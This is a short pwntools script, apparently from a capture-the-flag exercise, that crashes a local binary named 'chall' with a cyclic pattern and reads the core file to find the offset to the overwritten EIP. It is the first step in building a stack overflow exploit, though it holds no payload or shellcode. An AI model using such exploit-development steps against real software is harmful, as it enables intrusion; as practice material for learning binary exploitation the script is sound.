from pwn import *

context.binary = './chall'
p = process('./chall')

payload = cyclic(200)
p.sendline(payload)

p.wait()
core = p.corefile

eip = core.eip
print("EIP:", hex(eip))

offset = cyclic_find(eip)
print("offset:", offset)